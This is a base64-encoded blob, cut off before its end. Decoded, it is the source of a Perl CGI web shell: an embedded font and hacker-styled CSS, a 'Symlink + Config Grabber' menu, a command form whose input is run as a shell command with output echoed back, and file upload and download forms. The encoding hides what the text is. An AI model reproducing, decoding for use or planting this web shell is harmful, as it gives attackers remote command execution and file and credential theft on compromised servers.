TRneFY0UnBVTmh6NHJMUy9jVXpOSmkvRGdJSGFFaUVtUEtHM09iVktmMk96MGc1eE1mYTNkbUttdVFwenlXVk1SWTJTUzRaaFp1Zk5KbGRma1U3VzJZdWJYQ04wTWc3ZDFyMmhQNUhCK1dpNmQzbDNmNStZT1dleGs3djhOOFNHRHV6d3I0L3RPZ2hmNlV5MERyV08xcC9aaHBNUkNRMjFqalNlMlZwL1M1Uzg0M0ZORkJJZXg4VEo3Slpvc1EvWW0vUTVJNGdaMTgzWFZkZzdYMWRobjlwVk9DZTR5cWluYzlYT3dxamw1M1FYZmc2Viszd2RocmwvS3VhVFo5TFcrcCttYlZ4d3VUM0ljb3NnbFgwY2lhalE1NUJJaTJ2bnB6Rlp6QThxTkNxWXRtTStHc3ZubzlGZnpDbTdhTEcxNFBiUUJub1cyelZRaWlwOERxbDdGTTA5TDYyclptSmJoZDRpdHIxN0xzVnpvYTJhVTNiUm5ITDVWRTVaSGN2NFlrc3BISzlTamxlSk16RXVOcStDMFh5OGdDeUFiZWNNczI4ZUQyN2VNVDgwSDdhbHZYVkJuaXBocmMvYlhUYzgxVjIzK245NWQxMU1XSDlzaDEwU1JCSDltRDY3Mmllb3NLbzkrMkg4RGtBYjNlcnptc3FLejJ1cVVudjJxNEFERTlqT1pCSlJoMTk5YUJPaURyOWo2cUZOWlpqQ3RxTjZtL0hRSnZ1VkQyMmEwYmUvK055bTJwMHJ1by91cUp2ZHVUKzg3dVowZXNPS3dqbmRzK1VGUThEWE5QclVyaXZiOS9mczY0NkZxeFQ3b2N4bEhjemxVbVlsOC9MYzJjUmQ5U3RTOGlLUTQyVkorbUQ1NE1WOFJKSFNpUEtZVjVqbzhaVExDZEliVjQ3SHhYeEtrZDVWZjRUNWx5TkJKUllTeDhmaWdHRncydVJsSzJnL2wvK0VYQ3kwVmo1V1ZzN09YVHNmSXpnNjk5d1lTT2FqZDdqWHRRem9qMFdJWjJnWElROUhPMlZ5eXJNUTVVb09PMVRsaldZN2JwRXhxZ3NMSDRkaXhzZ3diU1prTWRQQ2FrczU3VnRsQWk4ZjhVMDV0dHpsN0ZtcXMzR3ZrQm03R3BSVHhqRDRKSkJLbStSSDl2QTJSSG96OXRIb3NQcHFWdklpODZOdnVldkt5ZjNxbnByZTJzejVpNmVHQnFPTDliNllMZk9aYklEZFNscEloMEdqbHZDYlNKeGMvK3ZmbVZqdUphTzJkZjkzWitRYklvQndHNWtUVEM2RW5xRS9KY2N4eEoya0NBRTdkMlU0ektEbFZ3c2hqS0N0eHZqZ09pWG5hNkk1WHl5dkVHREFxNU1ZNlVhOGF6Wk4wb3hERXYzamtCWkdKZ2l5b1JMZTYyeTVVaGZOR1ppRkhJOFBpQVUyb0crTlNXRDRrUWQvdE5vMnpwZ1hKOUZrWklSWiszTnc3U2s1aEJsUEhKak9Jc3h1QnhkT1VkUlhIMWl6c2FudHMvN3d4dHIzMk1LWDNiR211SzlPZEVYNzR5MzNSVVA5M1UwYkdnSW5MQUV4RkloNlM4M2xZakFROTVuSWczK1hqcVpxeVUvNnhnOTJkZCsyNFRPRmNsTzVQYnVqSzhYN3gveWVqbTM5TjNVL2tOL1U5S2RiNnJLMzN0ZllPTHFwdnJaL2oyMzNvU1BLK2xYcWUzb1pubmFsSFpwZDRZT0d2VG9sT3d4WVgwNDcxQ3JsUHVOdUU5WXZDY3BxRmNTOFd5bWs5OVBESVdYcDBuSS9mT1MxQTVoSEhTTkprNVZEV0ZwZldYMzFJcUdGMXRZVmhVUDc1dHNKTWw4VjBmTlhyaDlDREpvbyt4N2dCUzE0QkpKV2xMalVWQnN2WGJHTlY0bEdhWGNvRTYxS3FiS1BnU2orbVdiM2xFRW56TTgxR3prZitHRStrRkhKVGx2NmpwY1o3ZUJ4YVRXVEt2cklXNVFHZXZRWkZXVllpSStMaVhabWtnMldHVzJ0NTdoT1A3OWF1ZmtDa1lTWi9SaVpXZDBXbWQvL0hIT0kvSXdiWkFlVjV6c3FUb0x5cUtPcDV6dWlVM0NJL1FYNTJlSEQ4SHVHL0V6RFhQWDNBdnhldzlDZnc3MFQzSGIyWmUwNThOVVdNeWhaMmhKa21mcXdIMlFnZHZSQ28yRmhxQkpubEE2QnlLM3BUbThKc2YvQkRZRndTMTNDMmxqYm4yMXIxNFJyUndjNlRQc01Ra1Vpb3Z0TXJMTnJCOXhMNURheEwybFBLL2V5aS9uUzZYc1padDlMMlQrSjl3SVRNTDFMMHNMcWlUampOdUt0WXh2K1IyVlhFOXJHRllUMzdWdXQxcElzVzdGK29raUtvOGp5NGdwcDBXNk5JMHRFamxxRUNOUUlJNFFqU2pEQk9ERnFxeFkzOWtHWWtJaFNTaWltdEFXMzlGQktEMFg0SUJrVFJBbUJVRW9nVUh3b0RaZ2NldWlodUFVZlNnK2xjVGQ5ODk3SzJzcEpTdy9MTGdOdlorYnRtNTE1UC9NTjNwZGNvOHFFT0E5TVhrbmZlck00Q0hvcCtoNy9IUXI5SDE2Vy8rVDFoWW5WTE5XUXhsZnp1SUdiZEIxRzVnb2NqT2RUR29Bd0FuYVlYNldiSnVTbjZMUURkaHRkSXoxclozVmlvRS9ia2owRis5VnRpMGdSbDlyQlVYWVdzYitYby8yRStVanhuY1ZRNU1KMDNKSE81UExwTXRvektPZUE4dkpMNlV1Q2tscTVuSGVzU2M1UUxDb1drMXBwcm5LTVFuVW9FeDIrNnVrd29yUmtEU0RQVklxa1JYV1FqblFJbW5VZy9kZm00VmNlZExYZE10UEI2MmM2OVBkb3RKOVFOZ2tMd3FPN0puMEk0UXIrazBnYWp3cHpDc2llZnN1US9aOFVrRi8vRFRlNVB6Z1hpZkh5TUpKYjBTUDVUNmcwdkJQSnY1VEk3MkRyU1dmc0xMSno5SkRBVGtTcHEyMjdmVlI2SDkwdC9WZnA4MjhIVExMZmkrUlNKdGtYTjUySmdsZ2tZaGFabUt2U0VPMzBIb1h0SmUraks5aUh0MGpmSnlpU0o3RkJxeEF6YmwxVHRORi9tWEdEa2NzZFg5L1lsd3RMdWV4eVFaWUx5OW5jVWtIbTMwMVY1eFE0SHBpdUZoV2xXS1UrS1B2MFozeWYrOWJJK1NweDJ3TVF6WGpDbXJhREpXNkV2SDRvb0txVWFoQ01kY1Jud2pWRGdhdGV4aUdzTFJMSnBwN2pVY3pQMlV3eW1ZRUxYU0loMi9SME1wbENwZTVUT1o3THhaOXhnVzNMM0FyL05mNk0rQkl2WjNJZmRxR0xsanRBRVhtUmpFS3JEeCt1OGhMNmFFYmYwcmN1a0xaNTBuYVB0ZzEzMjdaNGRVYzRhazVybkxRUURBQUFzeHNnVGNnN1VFai9hUWVWVUdsR2YwMnZRcjBTMG9kM0xUWXVDWWltQ1hvbW44d29uSERPMUlNQk56L2hISXhCeGh3VWw0aVFxSENBRWs1cDRLbGFKOW1wWmN1ajlta3k2WUpqeUtjdFVQMGxTZjIwVEFSNElkWDIyR2lpRmMwT0czOXhNb09tSXBNYU96TEJFS0d0WVd0WWRIdUN5RWNlVER1RzQvTEZkWjVmMzRqKytzM2NOVFVjVzU2NjNmQ2dUYjllNDNuMHhrbTlFL2k0UGx1TGpZMStjdm1ISDBQbzg0WTc3Z3NvM3NiZTkrNlJqV0hQcHpjYnZrVEFGM2MzdnJ3UjhINHdQUDdMTGxzemlmS1A4YTd3TzJjbE1mQXRWcW00UFRpc2FRWTBZZ3VyWFRoaktMNGxlVldXTkNmMjBCTEZibG5uYlpHaUpZcVFNV2RoV0FRRzF0b1lSUi9ZOFRLY1dvaU94eVNhL0FsSXBFNWFLSlBtMHpQSEZ5SHhDOFdBRENDWU1FUkloQ2RiSTdJVGU2Sm92YkdHd3FMRE9XU3JWUlpxTnFmRExxN3h2TUNYWHkwS0FvK0Y5NjllMVdmUnRqNjd0Rm0vZGs3ZlI3NnBhbjF6VWFwY3IwOGNIRXpVcjFja1pwOWdOQjNjSVpZamQwOUMwMktIREg4VTI2bTFzcHZoWTVPdXNBdWFIQmJBM2xLUSswdnJKWjdseGptTzFqeUFtZ0RzSzRhUXh0UXdMMDY2TkZmcTlWWm5RZlc3RlhtbGNualk1T1BadURJem84U3ovaWJVSnUwOGNId29pVGRyckN3cGFtcVpqS2FkUC85a0FkODV2TWkrVitycEFUNHcrRDZYSzVtNGt2QVlxUDBNdGFiTlB6SHF1NzF5bk4xZnU4SmE4TWw3c2Nud3NMZ2gzUGdiMTR0TFh3QUFBSGphWTJCa0FJSXpad3puclhrY3oyL3psVUdlQXlUQWNPNk02azBFL1c4SkN3UGJFaUNYZzRFSkpBb0FtNllOU0hqYVkyQmtZR0JiOHJjSVJESUFBUXNEQXlNREtuZ0JBRkZjQTdKNDJuV1RzVXZEUUJUR1gxb1JSK21hb1lNRUJ3Y1J3UkpFQWlJZGdoUUpSUnhLaHVJZ0xpVklFY2ZnNEJDa1pIRndGQkZjSEJ5S0ZQOE1OMmNSd2NsWnhPL2RmY1Y0YU9ESDkvSnlkKy9kZDVmYXUyd0pucGxmZUVkZ0RuRUxERUFBSXVSdW9LOWtDRkxrVmtBVEhPTDkzT2Jra3Q5UFFBek91RTRPRGl3NjN0TjYrNXlqK2dnUzBPRDRsRG9oK3Q0RFkrWlBtZDhFR1ZnSEY5U003SUErOERsdWxUSG1lN3F2RWZoZzNYbmtPdEJqVUxLbmhPVFVrclhMU3R4bG5GVDBtZnZXZVFYWUFJdnNMV2FmVjZoM3ozaWIzZzlaVi9mWnNiMmFNUVY5YjdQZjNOWlY3MDN1azM2cVIxK0lhNkRIZmtMNkhkbTg4ZStPNTdvQWx1aDk0eDlhWEhmaU1IWUlLdWZnTXFMMkhYenV2NlR2ZnhFNVp6Rmw0SkJWL0hkSnFZVkR6RGt4OXhuUmM3My9ML1ZFWlBaYVpLcTFOUkh2RnZnV2VZSjJvYWs1dStZUDVsOFEvaC9MRnRrRHUrUk5hK2xjZk1POThOcTZMdnNJNmc4bURpWDhCdUhxWHdaNDJtTmdZTkNCd3lxR0xZd3ptSXlZcmpFWE1NOWlQc0w4Z2NXSHBZL2xDTXNqVmhGV0Q5WjlyUC9ZQ3RpZXNkdXd2K05JNGxqQXFjWTVqZk1XbHhxWERWY2NWd25YSSs0eW5pU2VON3dPdkZONEwvQ3g4Ulh4cmVKN3hLL0VuOFRmSWNBaDRDVXdUK0NEWUlUZ0NTRW5vU0toYmNMSFJHeEVxa1MyaUx3VGxSTDFFNjBRblNhNlR2U2NXSURZR3JGLzRqSGkreVFDSkk1Sjhram1TVjZRNHBNS2t0b2o5VWZhVDNxTkRJK01pOHdHV1E1Wkg5bHRjcnZrZnNrWHlhOVFFRkV3VUppajhFUGhoNktiNGpZbEZhVTV5aHpLZXNxUFZGUlV6cW42cWVhb1RsSGRwRmFpTmtudGhicVplbzhHaDRhR1JwWEdNWTB2bWxhYVRacFhOTDlvVldqemFUL1JDZFAxMC9QUWR6SElNcHhrdE0yWXozaVM4UTBUT1pNc2t3ZW1hcVk1cHR2TWpNeFdtZXVaOTVpL3N2Q3l1R1daWXRsbXhXVVZZYlhDbXNHNnp2cVFqWlRORmxzNzJ6TjJjZllTOWhjY09oeURIQjg1K1RodGMxWnhQdUVpNFpMaHNzZlZ5bldMbTRYYkZMY1A3bjd1RHp6eVBEWjVHbmsyZUY3eTB2SmE0YTNoM2VmajVYUEFOOC8zbForUVh3d09tT1ZYNGRmbU44OXZtOThiZnlYL0NQOWRBVklCRlFFYkFnV0FVQzh3Q0FqUEJIa0VaUVF0Q2JvRkFHUWJscU1BQVFBQUFPa0FUUUFGQUFBQUFBQUNBQUVBQWdBV0FBQUJBQUhFQUFBQUFIamFuWks3U2dOQkZJYi8zY1JMVUlJUkNSWWlVNGlkbTQxRzBGU0NRU3pjUnZEU2JpN0dZQzZ5R1JIQndtZndDU3g5QXA5QndjcktKN0gybjltemlzRkVDVU1tMzV6em44dk9IQUE1dkNFRko1MEJjTTlmekE3eVBNWHNJb3RINFJSMjhDU2N4aW8raENldzZDd0pUMkxGS1FsUDRjNDVGWjdHc3ZNdW5DRW5zVE1vdVF2Q3MrUjk0VG5rM1Z2aEhMSnUwczg4N1EvQ3orU2tueGY0N2l0MjBjTWxiaENoaFNiT29hR3dEaDlGTGtWdmlDNFZYWHByNURadEI5VFU0WkVNRzN1RC9qNzNPaTFYNURvNUltdm1hL0QvQ0ZWcjE5d1Y5bXcrL1NPNlpuVkZadlVIMUlGVjkzQklSWk9XTnJ1SWhtalVnRXJoMkhiU1p4MmpVTXp1WVd0b2pjSDQvMFFuc1dzak93enRyZngrbjBadHZqNnk4UzNXMDdadWZKK2FGTm9iN1ZqbEJmMktHYzcrZUoyS1BXdnBQT0FwWlBiRVA5cHJwa0J6S3Nvb2NGM2I1ZEgrSGRPUkNJOTFlendWeG9vWi82VlBxS255RHBKSmlpY25rTytwMEZ1ejg3a3QwMXpHSmwvTzdQN1hmRzk4QW90T2xsd0FlTnB0MEVWc0ZIRVV4L0h2YTNlNzdkYmRLZTR5TTl1cDRMdHRCM2QzQ3JWRld0aXl1SWJpRWdnSk53aDJBWUpySU1BQkNHNUJBaHc0NCtFQVhHSGErWFBqSlMrZnZQL2g5MTcrUk5CU2Y5eDA1bi8xeVc2UkNJa2tFaGR1b3ZBUVRReGVZb2tqbmdRU1NTS1pGRkpKSTUwTU1za2lteHh5eVNPZlZoVFFtamEwcFIzdDZVQkhPdG1idXRDVmJuU25CejNwaFlhT2dZOUNUSW9vcG9SU2V0T0h2dlNqUHdNWWlKOEFaWlJUZ2NVZ0JqT0VvUXhqT0NNWXlTaEdNNGF4akdNOEU1aklKQ1l6aGFsTVl6b3ptTWtzWmxNcExvN1N4Q1p1c0orUGJHWTNPempBY1k2Sm0rMjhaeVA3SkVvODdKSm90bktiRHhMRFFVN3dpNS84NWdpbmVNQTlUak9IdWV5aGlrZFVjNStIUE9NeFQzaHEvMU1OTDNuT0M4NVF5dy8yOG9aWHZLYU9MM3hqRy9NSU1wK0ZMS0NlUXpTd21FV0VhQ1RNRXBheWpNOHNaeVVyV01VYVZuT1Z3NnhqTGV2WndGZStjNDJ6bk9NNmIza25Yb21WT0ltWEJFbVVKRW1XRkVtVk5FbVhETW5rUEJlNHpCWHVjSkZMM0dVTEp5V0xtOXlTYk1saHArUktudVI3d3ZWQlRkUEtIWFdsWDFPcU9XQW9mVXBUV2Rxc1lRY29kYVdoOUNrTGxhYXlTRm1zTEZIK3kvTTc2aXBYMTcwMXdkcHdxTHFxc3JIT2VUSXNSOU55VllSRERTMkRhWlUxYXdXY08yeU52dzZybVZRQUFIamFQY3c5RXNGQUhBWHdiRlkya2MrTkNTb3pNWFJiYWJRYVNaUEdxTEl6em1GR3AxRnlDZ2Y0UitVU2p1QXNQS3p0M3UvTm0zZG5yeE94czlOUXNHazd4aTY2cTRWcXB5UjFROFVXNGFnbkpOU3VkWWlYRlhHMUpsRldOLzUwMVJjZUlLNEdQY0E3R1BpZjJjTWdBUHloUVI4SXNoOFloZVkyUWh0S1YzVzgzb014R0kwc0V6QmVXYVpnc3JETXdIUnVLY0ZzWnBtRGNtdzVBUFBsbjVvSzlRYmlCa3FzQUFBQlVxWjFXZ0FBKSBmb3JtYXQoJ3dvZmYnKTsNCiAgICBmb250LXdlaWdodDogbm9ybWFsOw0KICAgIGZvbnQtc3R5bGU6IG5vcm1hbDsNCg0KfQ0KDQpib2R5IHsNCmZvbnQtZmFtaWx5OiAidWJ1bnR1X21vbm9yZWd1bGFyIjsNCmZvbnQtc2l6ZToxMnB4Ow0KYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsNCmJhY2tncm91bmQtYXR0YWNobWVudDogZml4ZWQ7DQpiYWNrZ3JvdW5kLXBvc2l0aW9uOiBjZW50ZXI7DQpiYWNrZ3JvdW5kLWNvbG9yOiMyZDJiMmI7DQpjb2xvcjpsaW1lOw0KYmFja2dyb3VuZC1pbWFnZTogdXJsKCdodHRwczovL2NvbjdleHQtc2VjdXJpdHkuY29tL2ltYWdlcy9lcm9tYW5nYS5wbmcnKTsNCn0NCiNuYXZ7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDo5OTk7dG9wOjA7d2lkdGg6MTAwJTtsZWZ0OjcwJTsNCn0NCmEubmF2LWZva3VzIHtkaXNwbGF5OmJsb2NrOyB3aWR0aDphdXRvOyBoZWlnaHQ6YXV0bzsgYmFja2dyb3VuZDojMTkxOTE5OyBib3JkZXItdG9wOjBweDsgYm9yZGVyLWxlZnQ6IDFweCBzb2xpZCAjZmZmOyBib3JkZXItcmlnaHQ6MXB4IHNvbGlkICNmZmY7ICBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZmZmOyAgcGFkZGluZzo1cHggOHB4OyB0ZXh0LWFsaWduOmNlbnRlcjsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGNvbG9yOnJlZDsgbGluZS1oZWlnaHQ6MjBweDsgb3ZlcmZsb3c6aGlkZGVuOyBmbG9hdDpsZWZ0Ow0KfQ0KYS5uYXYtZm9rdXM6aG92ZXIge2NvbG9yOiNGRkZGRkY7IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsNCn0NCmlucHV0W3R5cGU9dGV4dF17DQoJYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IA0KCWNvbG9yOndoaXRlOw0KCW1hcmdpbjowIDEwcHg7DQoJZm9udC1mYW1pbHk6SG9tZW5hamU7DQoJZm9udC1zaXplOjEzcHg7DQoJYm9yZGVyOm5vbmU7DQp9DQppbnB1dFt0eXBlPXN1Ym1pdF0gew0KCWJhY2tncm91bmQ6IGJsYWNrOyANCgljb2xvcjp3aGl0ZTsNCgltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IjJkMmIyYiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxkaXYgaWQ9Im5hdiI+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/Ij48Yj5Ib21lPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWhlbHAiPjxiPkhlbHA8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkIj48Yj5VcGxvYWQ8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQiPjxiPkRvd25sb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXN5bWNvbmZpZyI+PGI+U3ltbGluayArIENvbmZpZyBHcmFiYmVyPC9iPjwvYT48L2Rpdj4NCjxicj4NCjxmb250IGNvbG9yPSJsaW1lIiBzaXplPSIzIj4NCkVORA0KfQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCnN1YiBHZXRDb29raWVzDQp7DQpAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCnsNCigkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCiRDb29raWVzeyRpZH0gPSAkdmFsOw0KfQ0KfQ0KDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSI/Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGNlbnRlcj48YnI+DQo8Zm9udCBjb2xvcj1saW1lPjxiPjxpPjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvaT48L2I+PC9mb250PjwvY2VudGVyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGJyPjxjZW50ZXI+PGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+PC9pPjwvYj48L2ZvbnQ+DQo8L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQo8Y29kZT4NCkVORA0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KICAgaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KICAgIHsNCiAgICAgICAgIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KICAgICAgICAjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCiAgICAgICANCiAgICAgICAgJE9sZERpciA9ICRDdXJyZW50RGlyOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQogICAgICAgIGNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQogICAgfQ0KICAgIGVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KICAgIHsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCiAgICAgICAgcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQogICAgICAgICAgICBhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQogICAgICAgIH0NCiAgICAgICAgaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KICAgICAgICB7DQogICAgICAgICAgICAkfD0xOw0KICAgICAgICAgICAgJENvbW1hbmQgLj0gIiB8IjsNCiAgICAgICAgICAgIG9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KICAgICAgICAgICAgd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRfID1+IHMvKFxufFxyXG4pJC8vOw0KICAgICAgICAgICAgICAgIHByaW50ICIkX1xuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR8PTA7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50IGAkQ29tbWFuZGA7DQogICAgICAgIH0NCiAgICAgICAgaWYoISRXaW5OVCkNCiAgICAgICAgew0KICAgICAgICAgICAgYWxhcm0oMCk7DQogICAgICAgIH0NCiAgICAgICAgcHJpbnQgIjwveG1wPiI7DQogICAgfQ0KICAgICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KICAgICZQcmludFBhZ2VGb290ZXI7DQp9DQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQpsb2NhbCgkRmlsZVVybCkgPSBAXzsNCmlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0Kew0KIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCmVsc2UgIyBmaWxlIG